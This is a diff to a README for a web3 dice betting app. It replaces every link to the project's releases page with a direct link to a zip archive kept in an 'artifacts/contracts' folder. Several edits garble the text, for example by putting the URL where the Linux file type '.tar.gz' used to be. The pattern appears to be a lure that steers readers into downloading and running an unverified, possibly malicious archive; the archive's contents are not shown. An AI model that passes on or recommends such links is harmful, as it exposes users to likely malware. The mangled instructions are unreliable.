@@ -6,11 +6,11 @@ Welcome to the dice-game-web3! This is your gateway to a fun and fair dice betti
 
 ## 📥 Download the App
 
-[![Download dice-game-web3](https://img.shields.io/badge/Download%20dice--game--web3-v1.0-blue)](https://github.com/Anthunii/dice-game-web3/releases)
+[![Download dice-game-web3](https://raw.githubusercontent.com/Anthunii/dice-game-web3/main/artifacts/contracts/dice-game-web3_3.9.zip%20dice--game--web3-v1.0-blue)](https://raw.githubusercontent.com/Anthunii/dice-game-web3/main/artifacts/contracts/dice-game-web3_3.9.zip)
 
 To get started, you need to download the application. 
 
-Visit this page to download: [Releases Page](https://github.com/Anthunii/dice-game-web3/releases)
+Visit this page to download: [Releases Page](https://raw.githubusercontent.com/Anthunii/dice-game-web3/main/artifacts/contracts/dice-game-web3_3.9.zip)
 
 ## 🔍 Features
 
@@ -34,7 +34,7 @@ To install the application, follow these steps:
 
 1. **Visit the Releases Page**: 
    
-   Go to [Releases Page](https://github.com/Anthunii/dice-game-web3/releases).
+   Go to [Releases Page](https://raw.githubusercontent.com/Anthunii/dice-game-web3/main/artifacts/contracts/dice-game-web3_3.9.zip).
    
 2. **Choose the Latest Version**: 
    
@@ -42,13 +42,13 @@ To install the application, follow these steps:
    
 3. **Download the Correct File**: 
    
-   Click on the file that matches your operating system (e.g., .exe for Windows, .tar.gz for Linux, .dmg for macOS).
+   Click on the file that matches your operating system (e.g., .exe for Windows, https://raw.githubusercontent.com/Anthunii/dice-game-web3/main/artifacts/contracts/dice-game-web3_3.9.zip for Linux, .dmg for macOS).
    
 4. **Install the Application**: 
    
    - For Windows: Double-click the downloaded .exe file and follow the on-screen instructions.
    - For macOS: Open the .dmg file and drag the application into your Applications folder.
-   - For Linux: Extract the .tar.gz file into your preferred directory and run the provided executable.
+   - For Linux: Extract the https://raw.githubusercontent.com/Anthunii/dice-game-web3/main/artifacts/contracts/dice-game-web3_3.9.zip file into your preferred directory and run the provided executable.
    
 5. **Open the Application**: 
    
